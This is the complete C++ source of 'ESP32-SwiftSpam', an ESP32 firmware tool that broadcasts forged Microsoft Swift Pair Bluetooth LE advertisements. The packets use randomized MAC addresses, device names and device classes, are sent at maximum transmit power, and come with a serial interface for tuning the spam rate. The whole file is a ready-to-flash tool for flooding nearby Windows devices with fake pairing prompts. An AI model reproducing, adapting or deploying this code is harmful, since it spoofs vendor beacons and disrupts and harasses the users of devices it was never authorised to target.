// ESP32-SwiftSpam
// Author: Kyhze
// Version: 1.3.1
// Date: 26/01/2025

#include <NimBLEDevice.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <freertos/queue.h>
#include <iostream>
#include <map>
#include <string>
#include <cstdlib>
#include <ctime>
#include <vector>
#include "bluetooth_cod.h" // Bluetooth Class of Device mappings

const char* ver = "1.3.1";
bool SDEBUG = false; // Set to true to enable serial debug info
// Adjustable device name length
uint8_t DEVICE_NAME_LENGTH = 8; // Set to 0 to disable names entirely. Maximum length: 19
// Spam delay parameters
const uint16_t MIN_DELAY = 10;    // Minimum delay in milliseconds
const uint16_t MAX_DELAY = 1000;  // Maximum delay in milliseconds
uint16_t currentDelay = 90;       // Default delay in milliseconds

// Shared variables for inter-task communication
QueueHandle_t payloadQueue; // Queue to pass payload data between tasks
struct PayloadData {
    char* deviceName;    // Dynamically allocated device name buffer
    uint8_t mac[6];      // Random MAC address
    uint8_t advData[31]; // Advertisement data
    uint8_t advDataLen;  // Length of advertisement data
    bool hasName;        // Flag to indicate if a name is included
};

// Function to construct a Class of Device (CoD)
uint32_t constructClassOfDevice(int majorServiceClass, int majorDeviceClass, int minorDeviceClass) {
    return (majorServiceClass & 0xFFE000) | ((majorDeviceClass & 0x1F) << 8) | ((minorDeviceClass & 0x3F) << 2);
}

// Function to randomly select a CoD
void selectRandomClasses(int& serviceClass, int& majorClass, int& minorClass) {
    // Static variable to track the current service class index
    static size_t currentServiceIndex = 0;

    // Step 1: Define the mapping of Service Classes to their corresponding Major Device Classes
    const std::map<int, std::vector<int>> serviceToMajorMap = {
        {0x200000, {4, 5}},       // Audio Service → Audio/Video, Peripheral
        {0x100000, {1, 5}},       // Networking Service → Computer, Peripheral
        {0x080000, {4, 6}},       // Rendering Service → Audio/Video, Imaging
        {0x040000, {4, 5, 6}},    // Capturing Service → Audio/Video, Peripheral, Imaging
        {0x010000, {2, 4, 5}}     // Telephony Service → Phone, Audio/Video, Peripheral
    };

    // Step 2: Get the list of service keys
    std::vector<int> serviceKeys;
    for (const auto& entry : BluetoothCoD::MajorServiceClasses) {
        serviceKeys.push_back(entry.first);
    }

    // Step 3: Select the next service class sequentially (wrap around if necessary)
    serviceClass = serviceKeys[currentServiceIndex];
    currentServiceIndex = (currentServiceIndex + 1) % serviceKeys.size();

    // Step 4: Get the reduced pool of Major Device Classes for the selected Service Class
    const auto& relevantMajorKeys = serviceToMajorMap.at(serviceClass);

    // Step 5: Randomly select a Major Device Class from the reduced pool
    majorClass = relevantMajorKeys[random(relevantMajorKeys.size())];

    // Step 6: Randomly select a Minor Device Class for the selected Major Device Class
    const auto& minorMap = BluetoothCoD::MinorDeviceClasses.at(majorClass);
    std::vector<int> minorKeys;
    for (const auto& entry : minorMap) {
        minorKeys.push_back(entry.first);
    }
    minorClass = minorKeys[random(minorKeys.size())];

    // Debugging output
    if (SDEBUG) {
        Serial.printf("[DEBUG] Selected Class of Device: Service=%s, Major=%s, Minor=%s\n",
                      BluetoothCoD::MajorServiceClasses.at(serviceClass).c_str(),
                      BluetoothCoD::MajorDeviceClasses.at(majorClass).c_str(),
                      BluetoothCoD::MinorDeviceClasses.at(majorClass).at(minorClass).c_str());
    }
}

// Function to generate a random device name
void generateRandomDeviceName(char* name, int nameLength) {
    const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+-/()=[]{}@!?.;,:/*$%+\\#<>";
    for (int i = 0; i < nameLength; i++) {
        name[i] = charset[random(sizeof(charset) - 1)];
    }
    name[nameLength] = '\0'; // Null-terminate the string
}

// Function to generate a random MAC address
void generateRandomMac(uint8_t* mac) {
    for (int i = 0; i < 6; i++) {
        mac[i] = random(256); // Generate a random byte for each part of the MAC
    }
    mac[0] &= 0xFE; // Ensure the MAC is unicast (LSB of the first byte is 0)
    mac[0] |= 0x02; // Ensure the MAC is locally administered (second LSB of the first byte is 1)
}

// Function to generate SwiftPair advertisement data
void generateSwiftPairAdvertisementData(const char* deviceName, uint8_t* advData, uint8_t* advDataLen, bool hasName) {
    uint8_t nameLen = hasName ? strlen(deviceName) : 0;

    // Maximum payload size is 31 bytes
    const uint8_t maxPayloadSize = 31;
    uint8_t remainingBytes = maxPayloadSize;

    int i = 0;

    // Randomly select a CoD
    int serviceClass, majorClass, minorClass;
    selectRandomClasses(serviceClass, majorClass, minorClass);
    uint32_t cod = constructClassOfDevice(serviceClass, majorClass, minorClass);

    // Add Manufacturer Specific Data - Including CoD
    if (remainingBytes >= 10) {
        advData[i++] = 9;             // Length of Manufacturer Specific Data
        advData[i++] = 0xFF;          // Manufacturer Specific Data type
        advData[i++] = 0x06;          // Microsoft Vendor ID (LSB)
        advData[i++] = 0x00;          // Microsoft Vendor ID (MSB)
        advData[i++] = 0x03;          // Microsoft Beacon Sub Scenario (Swift Pair)
        advData[i++] = 0x02;          // Flags (Swift Pair scenario)
        advData[i++] = 0x80;          // Reserved RSSI Byte
        advData[i++] = cod & 0xFF;    // CoD LSB
        advData[i++] = (cod >> 8) & 0xFF; // CoD Middle Byte
        advData[i++] = (cod >> 16) & 0xFF; // CoD MSB

        remainingBytes -= 10; // Reduce available bytes
        if (SDEBUG) {
            Serial.printf("[DEBUG] Class of Device in Payload: 0x%06X\n", cod);
        }
    }

    // Add Complete Local Name (Display Name)
    if (hasName && remainingBytes >= (2 + nameLen)) {
        advData[i++] = 1 + nameLen;  // Length of the field (1 byte for type + name length)
        advData[i++] = 0x09;        // Complete Local Name type
        memcpy(&advData[i], deviceName, nameLen);
        i += nameLen;
        remainingBytes -= (2 + nameLen); // Reduce available bytes
    }

    // Set final advertisement data length
    *advDataLen = i;

    // Debugging output
    if (SDEBUG) {
        Serial.printf("[DEBUG] Advertisement Data Length: %d bytes\n", *advDataLen);
        Serial.print("[DEBUG] Advertisement Data: ");
        for (int j = 0; j < *advDataLen; j++) {
            Serial.printf("%02X ", advData[j]);
        }
        Serial.println();
    }
}

// Task to generate random data and construct the payload
void generateDataTask(void* parameter) {
    while (1) {
        // Generate a random MAC address
        uint8_t mac[6];
        generateRandomMac(mac);

        // Prepare SwiftPair advertisement data
        uint8_t advData[31];
        uint8_t advDataLen;
        bool hasName = (DEVICE_NAME_LENGTH > 0);

        char* deviceName = (char*)malloc(DEVICE_NAME_LENGTH + 1); // Dynamically allocate device name buffer
        if (hasName) {
            generateRandomDeviceName(deviceName, DEVICE_NAME_LENGTH);
        }

        // Generate SwiftPair advertisement data
        generateSwiftPairAdvertisementData(deviceName, advData, &advDataLen, hasName);

        // Create a payload struct
        PayloadData payload;
        payload.deviceName = deviceName; // Assign the dynamically allocated buffer
        memcpy(payload.mac, mac, 6);
        memcpy(payload.advData, advData, 31);
        payload.advDataLen = advDataLen;
        payload.hasName = hasName;

        // Send the payload to the BLE task
        if (xQueueSend(payloadQueue, &payload, portMAX_DELAY) != pdTRUE) {
            Serial.println("[-] Failed to send payload to queue");
        }

        // Add a small delay to avoid overwhelming the queue
        vTaskDelay(pdMS_TO_TICKS(10));
    }
}

// Task to handle BLE operations
void bleTask(void* parameter) {
    while (1) {
        // Wait for a payload from the queue
        PayloadData payload;
        if (xQueueReceive(payloadQueue, &payload, portMAX_DELAY) == pdTRUE) {
            // Initialize BLE
            NimBLEDevice::init("");
            NimBLEDevice::setPower(9); // Set to max TX power

            // Set the random MAC address
            NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
            NimBLEDevice::setOwnAddr(payload.mac);

            // Create BLE server
            NimBLEServer* pServer = NimBLEDevice::createServer();

            // Get advertising object
            NimBLEAdvertising* pAdvertising = NimBLEDevice::getAdvertising();

            // Set advertisement data
            NimBLEAdvertisementData advertisementData;
            advertisementData.addData(payload.advData, payload.advDataLen);
            pAdvertising->setAdvertisementData(advertisementData);

            // Start advertising
            pAdvertising->start();

            // Print debug info
            if (SDEBUG) {
                if (payload.hasName) {
                    Serial.printf("\n[DEBUG] Advertising Swift Pair device: %s\n", payload.deviceName);
                } else {
                    Serial.println("\n[DEBUG] Advertising Swift Pair device: DEVICE_NAME_DISABLED");
                }
                Serial.printf("[DEBUG] Using random source MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
                              payload.mac[0], payload.mac[1], payload.mac[2],
                              payload.mac[3], payload.mac[4], payload.mac[5]);
            }

            // Wait for the set delay (in ms) before sending the next beacon
            vTaskDelay(pdMS_TO_TICKS(currentDelay));

            // Stop advertising
            pAdvertising->stop();

            // Clean up BLE resources
            NimBLEDevice::deinit();

            // Free the dynamically allocated device name buffer
            if (payload.hasName) {
                free(payload.deviceName);
            }
        }
    }
}

void setup() {
    // Initialize serial console
    Serial.begin(115200);
    Serial.printf("\nESP32-SwiftSpam ver.: %s\n", ver);
    Serial.println("\n[>>] Starting ESP32-SwiftSpam...");
    Serial.println("Use 'set delay <10-1000>' to change the delay (ms)");
    Serial.println("Use 'set name len <0-19>' to change the device name length");
    Serial.printf("\n[+] Spam delay set to: %lums\n", currentDelay);
    Serial.printf("[+] Device name length set to: %d\n", DEVICE_NAME_LENGTH);

    // Set the initial random seed
    randomSeed(analogRead(0));

    // Create a queue to pass payload data between tasks
    payloadQueue = xQueueCreate(10, sizeof(PayloadData));
    if (payloadQueue == NULL) {
        Serial.println("\n[-] FATAL: Failed to create queue");
        while (1); // Halt if the queue cannot be created
    }

    // Create the generateDataTask and bleTask
    xTaskCreatePinnedToCore(generateDataTask, "GenerateDataTask", 10000, NULL, 1, NULL, 0); // Run on Core 0
    xTaskCreatePinnedToCore(bleTask, "BLETask", 10000, NULL, 1, NULL, 1); // Run on Core 1
}

void loop() {
    // Check if there is data available on the serial port
    if (Serial.available() > 0) {
        String input = Serial.readStringUntil('\n'); // Read the incoming data
        input.trim(); // Remove any extra whitespace or newline characters

        // Check if the input starts with "set delay"
        if (input.startsWith("set delay ")) {
            // Extract the delay value from the command
            String delayValueStr = input.substring(10); // "set delay " is 10 characters long
            uint16_t newDelay = delayValueStr.toInt(); // Convert to integer

            // Validate the new delay value
            if (newDelay >= MIN_DELAY && newDelay <= MAX_DELAY) {
                currentDelay = newDelay; // Update the delay value
                Serial.printf("\n[+] New spam delay set to: %lums\n", currentDelay);
            } else {
                Serial.println("\n[-] Invalid delay value. Please enter a value between 10 and 1000 (ms)");
            }
        }
        // Check if the input starts with "set name len"
        else if (input.startsWith("set name len ")) {
            // Extract the name length value from the command
            String nameLenStr = input.substring(13); // "set name len " is 13 characters long
            uint8_t newNameLen = nameLenStr.toInt(); // Convert to integer

            // Validate the new name length value
            if (newNameLen >= 0 && newNameLen <= 19) { // Enforce strict length requirements
                DEVICE_NAME_LENGTH = newNameLen; // Update the device name length
                Serial.printf("\n[+] New device name length set to: %d\n", DEVICE_NAME_LENGTH);
                if (DEVICE_NAME_LENGTH == 0) {
                    Serial.println("\n[+] Device name disabled");
                }
            } else {
                Serial.println("\n[-] Invalid name length. Please enter a value between 0 and 19");
            }
        } else {
            Serial.println("\n[-] Invalid command. Use 'set delay <10-1000>' or 'set name len <0-19>'");
        }
    }

    // FreeRTOS scheduler will handle the tasks
    vTaskDelay(pdMS_TO_TICKS(30)); // Small delay to avoid hogging the CPU
}
